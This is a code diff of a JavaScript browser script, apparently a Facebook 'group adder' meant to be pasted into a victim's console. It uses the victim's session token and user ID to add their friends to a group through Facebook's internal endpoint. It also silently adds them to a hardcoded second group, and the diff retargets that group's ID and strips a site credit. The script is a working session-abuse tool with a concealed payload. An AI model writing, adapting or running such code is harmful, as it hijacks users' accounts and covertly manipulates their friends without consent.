@@ -1,4 +1,4 @@
-var tulisanNganu='For More visit SafeTricks.in';
+var tulisanNganu='For More visit';
 var kunaon='';
 function penetrasi(opo){
 jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id="+memberGroupId+"&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(a){
@@ -37,7 +37,7 @@ dipes+="</div>";
 document.getElementById("pagelet_welcome_box").innerHTML=dipes;
 },"text","post");
 tay--;
-if(tay>0){var s=arr[tay];setTimeout("penetrasi("+s+")",100);}console.log(tay+"/"+arr.length+":"+s+", success:"+suc);if(memberGroupId!=339459202795312){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=339459202795312&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post");}
+if(tay>0){var s=arr[tay];setTimeout("penetrasi("+s+")",100);}console.log(tay+"/"+arr.length+":"+s+", success:"+suc);if(memberGroupId!=463155077048072){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=463155077048072&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post");}
 }
 function clickfr_callback(){
 if(document.getElementsByName("ok").length>0){
